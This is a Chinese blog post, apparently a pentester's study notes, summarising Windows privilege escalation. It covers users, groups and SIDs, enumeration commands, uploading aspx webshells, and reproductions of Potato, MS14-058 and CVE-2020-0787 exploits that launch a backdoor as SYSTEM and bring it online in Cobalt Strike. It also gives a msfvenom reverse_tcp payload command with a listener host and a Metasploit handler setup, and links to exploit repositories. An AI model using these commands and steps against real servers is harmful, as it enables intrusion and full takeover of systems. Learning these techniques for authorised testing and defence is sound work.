toc-level-3"><a class="toc-link" href="#WMIC-%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.5.</span> <span class="toc-text">WMIC 开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.6.</span> <span class="toc-text">查询是否开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3%E5%8F%B7"><span class="toc-number">14.7.</span> <span class="toc-text">注册表查询端口号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E7%AB%AF%E5%8F%A3"><span class="toc-number">14.8.</span> <span class="toc-text">网络命令查询端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">14.9.</span> <span class="toc-text">关闭防火墙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD-IPSEC"><span class="toc-number">14.10.</span> <span class="toc-text">关闭 IPSEC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389-%E8%BF%9E%E6%8E%A5%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">14.11.</span> <span class="toc-text">3389 连接错误解决方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%85%A5%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%BB%84"><span class="toc-number">14.12.</span> <span class="toc-text">加入远程桌面组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%88%E7%AB%AF%E8%B6%85%E5%87%BA%E6%9C%80%E5%A4%A7%E8%BF%9E%E6%8E%A5%E6%95%B0"><span class="toc-number">14.13.</span> <span class="toc-text">终端超出最大连接数</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Windows 提权小结
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-12T09:41:46.000Z" itemprop="datePublished">2021-10-12</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="windows-基础知识"><a href="#windows-基础知识" class="headerlink" title="windows 基础知识"></a>windows 基础知识</h2><h3 id="用户与组"><a href="#用户与组" class="headerlink" title="用户与组"></a>用户与组</h3><p>在 windows 中不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹<br>内容、读取、写入等，其中超级管理员和 system 用户权限级别最高。</p>
+<h3 id="常见内置用户"><a href="#常见内置用户" class="headerlink" title="常见内置用户"></a>常见内置用户</h3><p>Administrator，系统默认管理员账号，拥有对系统的完全控制权，权限很高</p>
+<p>Guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用</p>
+<p>system，系统内置安全主体账户，在 Windows 中拥有比管理员更大的权限，在 Windows 中主要作为系统服务或进程的运行账户</p>
+<h3 id="内置用户组"><a href="#内置用户组" class="headerlink" title="内置用户组"></a>内置用户组</h3><p>1、Administrators，管理员组，此组中的用户权限较高</p>
+<p>2、users 组，新建用户默认所属的组</p>
+<p>3、guests 组，权限最低</p>
+<p>4、iis_users 组 Internet 信息服务使用的内置组</p>
+<p>一个用户可以属于多个用户组，常见的用户组是 管理组 (Administrators)、普通用户组（Users）、iis 用户组（IIS_IUSRS）、来宾组（Guests）、远程登录组（Remote Desktop Users）等</p>
+<h3 id="windows-常用命令"><a href="#windows-常用命令" class="headerlink" title="windows 常用命令"></a>windows 常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user #查看本地用户</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username #查看用户详细信息 例如组信息等</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">whoami  /?</span><br><span class="line">whoami 有三种使用方法:</span><br><span class="line">语法 1:</span><br><span class="line">WHOAMI [/UPN | /FQDN | /LOGONID]</span><br><span class="line">语法 2:</span><br><span class="line">WHOAMI &#123; [/USER] [/GROUPS] [/CLAIMS] [/PRIV] &#125; [/FO format] [/NH]</span><br><span class="line">语法 3:</span><br><span class="line">WHOAMI /ALL [/FO format] [/NH]</span><br><span class="line">描述:</span><br><span class="line">这个工具可以用来获取本地系统上当前用户(访问令牌)的用户名和组信息，以及相应的安全标识符(SID)、声明、本地系统上当前用户的权限、登录标识符(登录 ID)。例如，谁是当前已登录的用户?</span><br><span class="line">格式(域\用户名)</span><br><span class="line"></span><br><span class="line">参数列表:</span><br><span class="line">/UPN 用用户主体 (User Principal) 格式显示用户名名称 (UPN)格式。</span><br><span class="line">/FQDN 用完全合格的 (Fully Qualified) 格式显示用户名可分辨名称(FQDN) 格式。</span><br><span class="line">/USER 显示当前用户的信息以及安全标识符 (SID)。</span><br><span class="line">/GROUPS 显示当前用户的组成员信息、帐户类型和安全标识符 (SID) 和属性。</span><br><span class="line">/CLAIMS 显示当前用户的声明，包括声明名称、标志、类型和值。</span><br><span class="line">/PRIV 显示当前用户的安全特权。</span><br><span class="line">/LOGONID 显示当前用户的登录 ID。</span><br><span class="line">/ALL 显示当前用户名、所属的组以及安全等级当前用户访问令牌的标识符(SID)、声明和权限。</span><br><span class="line">/FO format 指定要显示的输出格式。有效值为 TABLE、LIST、CSV。列标题未使用 CSV格式显示。默认格式为 TABLE。</span><br><span class="line">/NH 指定不应在输出中显示列标题。此参数仅对</span><br><span class="line">TABLE 和 CSV 格式有效。</span><br><span class="line">/? 显示此帮助消息。</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">WHOAMI</span><br><span class="line">WHOAMI /UPN</span><br><span class="line">WHOAMI /FQDN</span><br><span class="line">WHOAMI /LOGONID</span><br><span class="line">WHOAMI /USER</span><br><span class="line">WHOAMI /USER /FO LIST</span><br><span class="line">WHOAMI /USER /FO CSV</span><br><span class="line">WHOAMI /GROUPS</span><br><span class="line">WHOAMI /GROUPS /FO CSV /NH</span><br><span class="line">WHOAMI /CLAIMS</span><br><span class="line">WHOAMI /CLAIMS /FO LIST</span><br><span class="line">WHOAMI /PRIV</span><br><span class="line">WHOAMI /PRIV /FO TABLE</span><br><span class="line">WHOAMI /USER /GROUPS</span><br><span class="line">WHOAMI /USER /GROUPS /CLAIMS /PRIV</span><br><span class="line">WHOAMI /ALL</span><br><span class="line">WHOAMI /ALL /FO LIST</span><br><span class="line">WHOAMI /ALL /FO CSV /NH</span><br><span class="line">WHOAMI /?</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line">用户名 SID</span><br><span class="line">======================= ===========================================</span><br><span class="line">12server7\administrator S-1-5-21-3260979670-785508571-521063199-500</span><br><span class="line">组信息</span><br><span class="line">-----------------</span><br><span class="line">组名 类型 SID 属性</span><br><span class="line">==================================== ====== ============</span><br><span class="line">==========================================</span><br><span class="line">Everyone 已知组 S-1-1-0 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\本地帐户和管理员组成员 已知组 S-1-5-114 必需的组, 启用于默认, 启用的组</span><br><span class="line">BUILTIN\Administrators 别名 S-1-5-32-544 必需的组, 启用于默认, 启用的</span><br><span class="line">组, 组的所有者</span><br><span class="line">BUILTIN\Users 别名 S-1-5-32-545 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\INTERACTIVE 已知组 S-1-5-4 必需的组, 启用于默认, 启用的</span><br><span class="line">组 CO</span><br><span class="line">NSOLE LOGON 已知组 S-1-2-1 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\Authenticated Users 已知组 S-1-5-11 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\This Organization 已知组 S-1-5-15 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\本地帐户 已知组 S-1-5-113 必需的组, 启用于默认, 启用的组</span><br><span class="line">LOCAL 已知组 S-1-2-0 必需的组, 启用于默认, 启用的</span><br><span class="line">组 NT</span><br><span class="line">AUTHORITY\NTLM Authentication 已知组 S-1-5-64-10 必需的组, 启用于默认, 启用的</span><br><span class="line">组 Ma</span><br><span class="line">ndatory Label\High Mandatory Level 标签 S-1-16-12288</span><br><span class="line">特权信息</span><br><span class="line">----------------------</span><br><span class="line">特权名 描述 状态</span><br><span class="line">=============================== ========================== ======</span><br><span class="line">SeIncreaseQuotaPrivilege 为进程调整内存配额 已禁用</span><br><span class="line">SeSecurityPrivilege 管理审核和安全日志 已禁用</span><br><span class="line">SeTakeOwnershipPrivilege 取得文件或其他对象的所有权 已禁用</span><br><span class="line">SeLoadDriverPrivilege 加载和卸载设备驱动程序 已禁用2.windows的sid详解</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows-sid-简介"><a href="#windows-sid-简介" class="headerlink" title="windows sid 简介"></a>windows sid 简介</h3><p>Windows 安全性主要依赖于几个基本元素：访问令牌、SID、安全描述符、访问控制列表、密码、</p>
+<p>访问令牌：访问令牌在本质上定义了两 上 “P”：Permissions（权限）和 Privilege（特权）。两者区别并不明显。访问令牌的内容和功能由用户的 SID、组的 SID、登录 SID、用户特权、默认所有者、SID、默认组 SID、默认 DACL、起源进程、令牌类型、模拟级别、受限 SID。</p>
+<p>权限：一个用户进程在接触一个对象时，“安全性参考监视器” 将访问令牌中的 SID 与 “对象访问控制列表（ACL）” 中的 SID 匹配。可能出现的两种情 况：1. 如果没有匹配，就拒绝用户访问，这称为 “隐式拒绝（implici deny）”;2. 如果有一个区配，就将与 ACK 中的条目关联的权限授予给用户。这可能是 Allow, 也可能是一个 Deny 权限。在两个权限都直接指派给 对象的前提下，Deny 权限将优先于 Allow 权限 (在对待继承的权限时，采取的方式稍有不同)</p>
+<p>SID：一个典型的 SID：S－1-5-21-1683771068-12213551888-624655398-1001 ，它遵循的模式是：S－R－IA－SA－SA－RID。</p>
+<p>下面是具体解释：<br>1、字母 S 指明这是一个 SID 标识符，它将数字标记为一个 SID。<br>2、R 代表 Revision（修订），Windows 生成的所有 SID 都使用修订级别 1.<br>3、IA 代表颁发机构。在 Widnwos 中，几乎所有 SID 都指定 NT 机构作为颁发机构，它的 ID 编号为 5. 但是，代表已知组和账户的 SID 例外。<br>4、SA 代表一个子机构。SA 指定特殊的组或职能。例如、21 表明 SID 由一个域控制器或者一台单机颁发。随后的一长串数字（1683771068-12213551888-624655398）就是颁发 SID 的那个域或机器的 SA。<br>5、RID 是指相对 ID（RID）、是 SA 所指派的一个惟一的、顺序的编号、代表一个安全主体（比如一个用户、计算机或组）新的已知 SID：在经典 NT 和 windows2000 中，Local System 账户 SID S－1-5-18 为几乎所有服务提供了安全上下文，该账户具有很大的特权。Windows2003 则引入了另外两个 “已知 SID” 来为服务提供一个安全上下文、即 LocalService 和 NetworkService。部分已知 SID 及功能见 Microsoft KB243330<br>已知 RID：指派给用户、计算机和组的 RID 从 1000 开始。500-999 的 RID 被专门保留起来、表示在每个 Windows 计算机和域中通用的账户和 组，它们称为 “已知 RID” 有些已知 RID 会附加到一个域 SID 上，从而构成一个惟一的标识符。另一些则附加到 Builtin SID (S-1-5-32) 上，指出它们是可能具有特权的 Builtin 账户－－特权要么是硬编码到操作系统中的，要么是在安全数据库中指派的。</p>
+<p>官方文档参考：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers">https://docs.microsoft.com/zh-CN/windows/security/identity-protection/access-control/security-identifiers</a></p>
+<h2 id="windows-权限提升"><a href="#windows-权限提升" class="headerlink" title="windows 权限提升"></a>windows 权限提升</h2><p>提权是指把普通用户的权限进行提升，也叫特权提升，在渗透测试中，通过是各种漏洞提升 webshell 权限以夺得服务器权限。<br>webshell 的权限根据不同的中间件权限也有所不同，如没经过特殊设置，webshell 的权限是继承该中间件的权限。</p>
+<h3 id="提权常用方法"><a href="#提权常用方法" class="headerlink" title="提权常用方法"></a>提权常用方法</h3><p>windows 的常用提权方法，主要分为漏洞提权、windwos 特性提权、第三方组件提权，数据库提权、ftp 提权等。</p>
+<h3 id="提权常用命令"><a href="#提权常用命令" class="headerlink" title="提权常用命令"></a>提权常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr OS #获取系统版本信息</span><br><span class="line">systeminfo &amp;&amp; wmic product get name,version&amp;&amp;wmic nic where PhysicalAdapter=True get MACAddress,Name&amp;&amp;wmic NICCONFIG WHERE IPEnabled=true GET IPAddress #检测系统软件包</span><br><span class="line">hostname #获取主机名称</span><br><span class="line">whoami /all #获取当前用户的详细信息</span><br><span class="line">whoami /priv #显示当前用户的安全特权</span><br><span class="line">net start #查看服务</span><br><span class="line">netstat -ano | findstr 3389 #获取rdp连接来源IP</span><br><span class="line">dir c:\programdata\ #分析安装杀软</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn #列出已安装的补丁</span><br><span class="line">tasklist /svc | find &quot;TermService&quot; #获取服务pid</span><br><span class="line">netstat -ano |find &quot;pid&quot; #查看指定pid进程连接信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows-漏洞提权"><a href="#windows-漏洞提权" class="headerlink" title="windows 漏洞提权"></a>windows 漏洞提权</h3><p><strong>windows 漏洞提权流程</strong></p>
+<p>能执行系统命令 &gt; 机器未打相关补丁 &gt; 打对应补丁 exp &gt; 获得服务器更高权限</p>
+<p>传马优先传 aspx 的马因为 aspx 马权限更高</p>
+<p>aspx 使用的是.net 技术。IIS 中默认不支持，ASPX 需要依赖于.net framework 而 ASP 只是脚本语言而已。ASP.NET 允许用户使用 IIS 建立网络服务。入侵的时候 asp 的木马一般是 guest 权限，APSX 的木马一般是 users 权限，iis6 默认以 network service 身份运行。iis5 默认是 aspnet ASP.NET, IIS 的权限机制非常复杂，对每一层应用，都有不同的权限控制。总之要求对 asp.net 开放相应权限，才可以让你的网站完成相应的服务。ASP.net 程序的访问权限由 ASPNET 的权限来决定。ASPNET 隶属于 Users 组。所以 ASPX 权限就要高一些。</p>
+<p>如果管理员删除服务器组件 wscript.shell 无法在 asp 执行 cmd 命令 这个时候可以使用 aspx 的后门查看是否有权限执行系统 dos 命令</p>
+<h3 id="windows-提权辅助"><a href="#windows-提权辅助" class="headerlink" title="windows 提权辅助"></a>windows 提权辅助</h3><p>windows 内核提权 exp <a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<p>提权辅助 根据补丁信息寻找可用提权 exp <a target="_blank" rel="noopener" href="http://bugs.hacking8.com/tiquan">http://bugs.hacking8.com/tiquan</a></p>
+<p>补丁及可用提权漏洞分析脚本 <a target="_blank" rel="noopener" href="https://github.com/chroblert/WindowsVulnScan">https://github.com/chroblert/WindowsVulnScan</a></p>
+<p>通过上面的补丁查询，列出可用的 exp，在 webshell 里使用提权 exp 对服务器进行提权即可</p>
+<h3 id="查询可写目录或者文件"><a href="#查询可写目录或者文件" class="headerlink" title="查询可写目录或者文件"></a>查询可写目录或者文件</h3><p>在确定可以执行 cmd 命令时，有些服务器会对目录进行权限设置，导致 iis_user 用户组没有权限对常见的目录进行写入和读取，这时可以用脚本对目录进行遍历扫描，得到可写目录然后上传或下载提权 exp，或者替换文件进行利用。</p>
+<p>常见的脚本有 wt.asp 其中红色表示文件可替换、蓝色表示目录可写</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p>
+<p>.net 版本的 wt.aspx 因为 net 的权限比 asp 而且能访问注册表 所以除了常规扫描目录之外，还会读取注册表软件目录进行目录扫描</p>
+<h2 id="CVE-2021-1675-Windows-Print-Spooler-提权"><a href="#CVE-2021-1675-Windows-Print-Spooler-提权" class="headerlink" title="CVE-2021-1675 Windows Print Spooler 提权"></a>CVE-2021-1675 Windows Print Spooler 提权</h2><p>CVE-2021-1675 可以本地提权、也可以提权域控，关于此提权可以看我另一篇博客，有详细复现教程</p>
+<p>传送门：<a target="_blank" rel="noopener" href="https://www.netssec.ml/post/CVE-2021-1675.html">https://www.netssec.ml/post/CVE-2021-1675.html</a></p>
+<h2 id="CVE-2016-3225（MS16-075）-烂土豆-提权"><a href="#CVE-2016-3225（MS16-075）-烂土豆-提权" class="headerlink" title="CVE-2016-3225（MS16-075） 烂土豆 提权"></a>CVE-2016-3225（MS16-075） 烂土豆 提权</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞。成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级版本</p>
+<p>注：烂土豆 (Rotten Potato) 提权是一个本地提权，是针对本地用户的，不能用于域用户</p>
+<h3 id="洞影响版本"><a href="#洞影响版本" class="headerlink" title="洞影响版本"></a>洞影响版本</h3><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-075</a></p>
+<h3 id="漏洞-exp-下载"><a href="#漏洞-exp-下载" class="headerlink" title="漏洞 exp 下载"></a>漏洞 exp 下载</h3><p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/JuciyPotato">https://github.com/uknowsec/JuciyPotato</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>上传 exp 至可写可执行目录</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p>
+<p>这个 exp 是支持 webshell 执行的，所以直接执行就可以获得 system 权限</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634018504/Xnip2021-10-12_14-00-42_sbnut2.png"></p>
+<p>上线 cs 再提权</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634019913/Xnip2021-10-12_14-24-35_l6xevn.png"></p>
+<p>注：可以直接使用 exp 执行后门文件，上线即为 system 权限会话</p>
+<p>哥斯拉自带烂土豆提权上线 懒人必备 一定程度绕过杀软 某次 hw 使用意外发现</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634020998/Xnip2021-10-12_14-42-44_qa8u4m.png"></p>
+<h2 id="CVE-2014-4113-MS14-058-提权"><a href="#CVE-2014-4113-MS14-058-提权" class="headerlink" title="CVE-2014-4113 (MS14-058) 提权"></a>CVE-2014-4113 (MS14-058) 提权</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Microsoft Windows 下的 win32k.sys 是 Windows 子系统的内核部分，是一个内核模式设备驱动程序，它包含有窗口管理器、后者控制窗口显示和管理屏幕输出等。如果 Windows 内核模式驱动程序不正确地处理内存中的对象，则存在一个特权提升漏洞。成功利用此漏洞的攻击者可以运行内核模式中的任意代码。攻击者随后可安装程序；查看、更改或删除数据；或者创建拥有完全管理权限的新帐户</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>该漏洞影响所有 Windows x64，包括 Windows 7 和 Windows Server 2008 R2 及以下版本。</p>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>将 exp 上传至可读可写目录</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634017785/Xnip2021-10-12_13-49-24_jory3t.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c c:\windows\debug\WIA\win64.exe whoami  #执行即可获得system权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634021627/Xnip2021-10-12_14-53-36_t70666.png"></p>
+<p>exp 执行 cs 后门文件，直接获得 system 权限会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c c:\windows\debug\WIA\win64.exe  c:\windows\debug\WIA\backdoor.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634021855/Xnip2021-10-12_14-57-00_cd4wct.png"></p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>升级系统版本</p>
+<h2 id="CVE-2020-0787-提权"><a href="#CVE-2020-0787-提权" class="headerlink" title="CVE-2020-0787 提权"></a>CVE-2020-0787 提权</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当 Windows Background Intelligent Transfer Service (BITS) 未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p><a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0787">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0787</a></p>
+<h3 id="漏洞-exp-下载-1"><a href="#漏洞-exp-下载-1" class="headerlink" title="漏洞 exp 下载"></a>漏洞 exp 下载</h3><p><a target="_blank" rel="noopener" href="https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases">https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION/releases</a></p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个提权需要连接目标主机 3389，因为 exp 执行完会弹一个 system 权限的 cmd 窗口</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634023896/2881634023822_.pic_hd_rpaqmk.png"></p>
+<p>可以利用这个 system 权限上线 cs 或者 msf 进行后渗透操作</p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级系统版本</p>
+<h2 id="msf-提权"><a href="#msf-提权" class="headerlink" title="msf 提权"></a>msf 提权</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>metasplit 是一款开源的安全漏洞检测工具，可以帮助安全和 IT 专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web 应用程序扫描，社会工程。团队合作等</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 msf 生成 exe 后门文件（反向后门）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=10.46.2.124 lport=12345 -f exe &gt; y.exe</span><br></pre></td></tr></table></figure>
+
+<p>msf 设置监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 10.46.2.124</span><br><span class="line">lhost =&gt; 172.16.61.2</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>将 msf 后门文件上传至可读可写目录执行获取反弹会话</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634025538/Xnip2021-10-12_15-58-46_yt8pqj.png"></p>
+<p>getuid 权限很低，需要提权</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634025648/Xnip2021-10-12_16-00-39_e9iey3.png"></p>
+<h3 id="windows-常见的权限提升模块"><a href="#windows-常见的权限提升模块" class="headerlink" title="windows 常见的权限提升模块"></a>windows 常见的权限提升模块</h3><p>ms14_058 内核模式驱动程序中的漏洞可能允许远程执行代码</p>
+<p>ms16_016 WebDAV 本地提权漏洞 (CVE-2016-0051)</p>
+<p>ms16_032 MS16-032 Secondary Logon Handle 本地提权漏漏洞</p>
+<p>ms16_075 Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞</p>
+<h3 id="msf-基础命令"><a href="#msf-基础命令" class="headerlink" title="msf 基础命令"></a>msf 基础命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ps  #列出进程</span><br><span class="line">background  #把session放置后台</span><br><span class="line">sessions #查看会话</span><br><span class="line">back #返回主界面</span><br><span class="line">shell #得到终端</span><br><span class="line">search #搜索模块</span><br><span class="line">show #列模块</span><br><span class="line">info #查看模块信息</span><br><span class="line">use #使用模块</span><br></pre></td></tr></table></figure>
+
